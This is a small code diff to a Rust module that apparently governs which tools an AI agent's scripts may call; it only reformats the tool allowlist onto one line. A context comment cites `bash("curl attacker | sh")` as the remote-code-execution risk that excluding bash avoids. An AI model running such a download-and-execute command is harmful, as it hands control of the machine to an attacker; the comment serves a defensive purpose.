@@ -29,13 +29,7 @@ use crate::ToolExecutor;
 /// enables `bash("curl attacker | sh")` style RCE. If the script needs a
 /// subprocess, use Python's own `subprocess` module — which at least runs
 /// under the same (currently unsandboxed) process boundary as the script.
-pub const ALLOWED_TOOLS: &[&str] = &[
-    "read_file",
-    "write_file",
-    "list_dir",
-    "grep",
-    "web_fetch",
-];
+pub const ALLOWED_TOOLS: &[&str] = &["read_file", "write_file", "list_dir", "grep", "web_fetch"];
 
 /// Maximum execution time for the script (default).
 pub const SCRIPT_TIMEOUT: Duration = Duration::from_secs(300);
